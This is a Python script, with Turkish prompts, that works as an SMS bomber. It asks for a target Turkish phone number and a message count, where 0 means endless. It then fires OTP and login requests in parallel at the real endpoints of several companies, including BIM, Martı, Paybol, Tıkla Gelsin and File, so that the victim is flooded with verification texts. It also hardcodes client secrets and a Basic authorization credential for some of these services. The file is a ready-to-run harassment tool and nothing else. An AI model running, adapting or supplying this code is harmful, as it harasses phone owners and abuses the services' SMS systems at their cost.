import subprocess, sys, os

try:
    import requests, urllib3, uuid
except ImportError:
    print("Gerekli kütüphaneler indiriliyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
finally:
    import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BIM"
        else:
            return False, "BIM"
    except:
        return False, "BIM"

def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {
            "mobilePhoneNumber": f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        if r1 == "200 OK":
            return True, "File"
        else:
            return False, "File"
    except:
        return False, "File"

def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {
            "msisdn" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Kim GB Ister"
        else:
            return False, "Kim GB Ister"
    except:
        return False, "Kim GB Ister"

def marti(number):
    try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {
            "mobilePhone" : f"{number}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Martı"
        else:
            return False, "Martı"
    except:
        return False, "Martı"

def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{number}",
                "challenge": f"{uuid.uuid4()}",
                "deviceUniqueId": f"web_{uuid.uuid4()}"
            },
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tıkla Gelsin"
        else:
            return False, "Tıkla Gelsin"
    except:
        return False, "Tıkla Gelsin"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {
            "otp": "",
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İpragaz"
        else:
            return False, "İpragaz"
    except:
        return False, "İpragaz"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=2)
            
            if r1.status_code == 200:
                return True, "Mopaş"
            else:
                return False, "Mopaş"
        else:
            return False, "Mopaş"
    except:
        return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {
            "otp_code" : "null",
            "phone_number" : f"90{number}",
            "reference_id" : "null"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        
        if r.status_code == 200:
            return True, "Paybol"
        else:
            return False, "Paybol"
    except:
        return False, "Paybol"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {
            "cep_tel" : f"{number}",
            "cep_tel_ulkekod" : "90"
        }
        headers = {
            "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tazı"
        else:
            return False, "Tazı"
    except:
        return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {
            "country_code": "90",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "GoFody"
        else:
            return False, "GoFody"
    except:
        return False, "GoFody"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Jetle"
        else:
            return False, "Jetle"
    except:
        return False, "Jetle"

def karma(number):
    try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {
            "phoneNumber" : f"90{number}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Karma"
        else:
            return False, "Karma"
    except:
        return False, "Karma"

def anadolu(number):
    try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": f"{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}"
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            return True, "Anadolu"
        else:
            return False, "Anadolu"
    except:
        return False, "Anadolu"

def send_service(number, service):
    global all_sends
    global success_sends
    global failed_sends
    result = service(number=number)
    if result[0] == True:
        all_sends += 1
        success_sends += 1
        print(f"[+] {all_sends} {result[1]}")
    else:
        all_sends += 1
        failed_sends += 1
        print(f"[-] {all_sends} {result[1]}")

def send(number, amount, worker_amount):
    global clear
    global all_sends
    global success_sends
    global failed_sends
    start_time = int(time.perf_counter())
    functions = [bim, marti, paybol, tiklagelsin, kimgbister, file]
    random.shuffle(functions)
    clear()
    print(f"{number} numarasına SMS gönderimi başlatıldı!\n")
    if amount == 0:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            i = 0
            while True:
                executor.submit(send_service, number, functions[i % len(functions)])
                i += 1
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            for i in range(amount):
                executor.submit(send_service, number, functions[i % len(functions)])
    print("\nGönderim tamamlandı!")
    print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi. {success_sends} başarılı, {failed_sends} başarısız.\n")
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    restart()

def watermark():
    print("""
       ___      __             __           __
  ____/ (_)____/ /_____  _____/ /____  ____/ /
 / __  / / ___/ __/ __ \/ ___/ __/ _ \/ __  / 
/ /_/ / (__  ) /_/ /_/ / /  / /_/  __/ /_/ /  
\__,_/_/____/\__/\____/_/   \__/\___/\__,_/   
""")
    print("-" * 50)
    print("Telegram : t.me/fatiqueos")
    print("Discord : fatiqueos")
    print("GitHub : fatiqueos")
    print("-" * 50)

def get_number():
    global clear
    while True:
        try:
            number = input(f"""Telefon Numarasını Yazın\n📞: """)
            number = "".join(filter(str.isdigit, number))  # Sadece sayıları al
            if len(number) == 10 and number[0] == "5":
                return number
            elif len(number) == 12 and number.startswith("905"):
                return number[2:]
            elif len(number) == 11 and number.startswith("05"):
                return number[1:]
            elif len(number) == 13 and number.startswith("905"):
                return number[3:]
            else:
                clear()
                print(f"Numara Yanlış Lütfen geçerli bir numara girin.")
        except:
            clear()
            print(f"Lütfen bir Numara Yazın.")

def get_amount():
    global clear
    while True:
        try:
            amount = int(input(f"""Kaç SMS Gönderilsin? Sınırsız Gönderim için "0" Basın.\n[?] : """))
            if amount >= 0:
                return amount
            else:
                clear()
                print(f"Girilen Sayı 0'dan Küçük Olamaz.")
        except:
            clear()
            print(f"Lütfen Bir Sayı Girin.")

def restart():
    global clear
    while True:
        question = input(f"Programdan çıkılsın mı?\n[Y/N] : ").upper().replace(" ", "")
        if question == "Y":
            quit()
        elif question == "N":
            clear()
            start()
            break
        else:
            clear()
            print(f"Yanlış Tuşa Basıldı!")

def start():
    global clear
    clear()
    watermark()
    number = get_number()
    amount = get_amount()
    worker_amount = 5
    send(number=number, amount=amount, worker_amount=worker_amount)

all_sends = 0
success_sends = 0
failed_sends = 0
clear = lambda: os.system("cls")

start()
